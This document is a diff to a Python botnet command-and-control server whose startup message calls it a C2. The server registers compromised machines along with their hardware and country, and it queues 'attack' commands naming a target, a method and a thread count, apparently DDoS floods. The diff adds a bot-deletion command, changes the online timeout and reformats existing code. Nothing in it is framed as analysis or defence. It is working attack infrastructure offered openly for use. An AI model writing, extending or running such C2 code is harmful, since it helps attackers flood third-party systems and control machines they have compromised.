@@ -20,11 +20,7 @@ def telegram_notify(msg):
     if not (TELEGRAM_TOKEN and TELEGRAM_CHAT_ID):
         return
     try:
-        subprocess.run([
-            "curl", "-s", "-X", "POST",
-            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-            "-d", f"chat_id={TELEGRAM_CHAT_ID}&text={msg}"
-        ], timeout=5)
+        subprocess.run(["curl", "-s", "-X", "POST", f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", "-d", f"chat_id={TELEGRAM_CHAT_ID}&text={msg}"], timeout=5)
     except:
         pass
 
@@ -70,17 +66,24 @@ async def handle_client(reader, writer):
         bots_list = []
         for bot_ip, bot in bots.items():
             last_seen = datetime.strptime(bot["last_seen"], "%Y-%m-%d %H:%M:%S")
-            bot["status"] = "online" if (now - last_seen).total_seconds() < 30 else "offline"
+            bot["status"] = "online" if (now - last_seen).total_seconds() < 45 else "offline"
             bots_list.append(bot)
         writer.write(json.dumps(bots_list).encode())
+    elif msg.startswith("delete:"):
+        target_ip = msg.split(":")[1]
+        if target_ip in bots:
+            del bots[target_ip]
+            save_bots()
+            writer.write(b"deleted")
+        else:
+            writer.write(b"not found")
     elif msg.startswith("attack:"):
         parts = msg.split(":", 1)[1].split("|")
         if len(parts) >= 3:
             target, method, threads = parts[0], parts[1], parts[2]
             bot_ips = parts[3].split(",") if len(parts) > 3 else list(bots.keys())
             for bot_ip in bot_ips:
-                commands_queue.setdefault(bot_ip, []).append(
-                    {"type": "attack", "target": target, "method": method, "threads": int(threads)})
+                commands_queue.setdefault(bot_ip, []).append({"type": "attack", "target": target, "method": method, "threads": int(threads)})
             save_commands()
             writer.write(b"commands queued")
         else:
@@ -125,14 +128,8 @@ async def handle_client(reader, writer):
         is_new = ip not in bots
         country = get_country(ip) if is_new else bots[ip].get("country", "")
         bots[ip] = {
-            "ip": ip,
-            "hostname": hostname,
-            "os": os_info,
-            "cpu": cpu,
-            "ram": ram,
-            "country": country,
-            "status": "online",
-            "rps": 0,
+            "ip": ip, "hostname": hostname, "os": os_info, "cpu": cpu, "ram": ram,
+            "country": country, "status": "online", "rps": 0,
             "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         }
         save_bots()
@@ -144,7 +141,7 @@ async def handle_client(reader, writer):
 
 async def main():
     server = await asyncio.start_server(handle_client, '0.0.0.0', HTTP_PORT)
-    print(f"[+] C2 (уведомления curl) на порту {HTTP_PORT}")
+    print(f"[+] C2 на порту {HTTP_PORT}")
     async with server:
         await server.serve_forever()
 
